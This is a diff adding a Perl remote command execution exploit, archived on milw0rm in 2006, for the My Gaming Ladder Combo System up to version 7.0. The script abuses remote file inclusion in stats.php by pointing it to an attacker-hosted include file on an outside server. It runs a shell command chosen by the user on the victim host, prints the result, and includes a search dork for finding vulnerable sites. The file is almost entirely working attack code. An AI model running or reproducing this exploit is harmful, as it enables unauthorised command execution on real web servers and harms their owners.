@@ -1,0 +1,69 @@
+#!/usr/bin/perl
+#Method found & Exploit scripted by nukedx
+#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
+#Original advisory: http://www.nukedx.com/?viewdoc=28
+#Usage: ladder.pl <host> <path> <cmd>
+#Dork: "Ladder Scripts by http://www.mygamingladder.com" 40.500 pages.
+use IO::Socket;
+if(@ARGV < 3) { usage(); }
+else { exploit(); }
+sub header()
+{
+  print "\n- NukedX Security Advisory Nr.2006-28\r\n";
+  print "- My Gaming Ladder Combo System <= 7.0 Remote Command Execution Exploit\r\n";
+}
+sub main::urlEncode {
+  my ($string) = @_;
+  $string =~ s/(\W)/"%" . unpack("H2", $1)/ge;
+  #$string# =~ tr/.//;
+  return $string;
+}
+sub usage() 
+{
+  header();
+  print "- Usage: $0 <host> <path> <cmd>\r\n";
+  print "- <host> -> Victim's host ex: www.victim.com\r\n";
+  print "- <path> -> Path to My Gaming Ladder ex: /ladder/\r\n";
+  print "- <cmd>  -> Command to execute ex: ls -la\r\n";
+  print "- This exploit needs allow_url_fopen set to 1 and register_globals on\r\n";
+  exit();
+}
+sub exploit () 
+{
+  #Our variables...
+  $echoing  = "";
+  $ldserver = $ARGV[0];
+  $ldserver =~ s/(http:\/\/)//eg;
+  $ldhost   = "http://".$ldserver;
+  $lddir    = $ARGV[1];
+  $ldport   = "80";
+  $ldtar    = "stats.php?dir[func]=&dir[base]=http://www.misssera.com.tr/old/rce.txt%3F&command=";
+  $ldcmd    = ""; for ($i=2; $i<=$#ARGV; $i++) {$ldcmd.="%20".urlEncode($ARGV[$i]);};
+  $ldreq    = $ldhost.$lddir.$ldtar.$ldcmd;
+  #Sending data...
+  header();
+  print "- Trying to connect: $ldserver\r\n";
+  $ld = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$ldserver", PeerPort => "$ldport") || die "- Connection failed...\n";
+  print $ld "GET $ldreq HTTP/1.1\n";
+  print $ld "Accept: */*\n";
+  print $ld "Referer: $ldhost\n";
+  print $ld "Accept-Language: tr\n";
+  print $ld "User-Agent: NukeZilla\n";
+  print $ld "Cache-Control: no-cache\n";
+  print $ld "Host: $ldserver\n";
+  print $ld "Connection: close\n\n";
+  print "- Connected...\r\n";
+  $echoing = "No";
+  while ($answer = <$ld>) {
+    if ($answer =~ /NukedX here/) { $echoing = "Yes"; }
+    if ($answer =~ /NukedX was here/) { print "- End of results\n"; exit(); }
+    if ($echoing =~ /Yes/) { 
+      if ($answer =~ /NukedX here/) { print "- Command executed succesfully here is results\r\n"; }
+      else { print "$answer"; }
+    }
+  }
+  #Exploit failed...
+  print "- Exploit failed\n"
+}
+
+# milw0rm.com [2006-04-22]
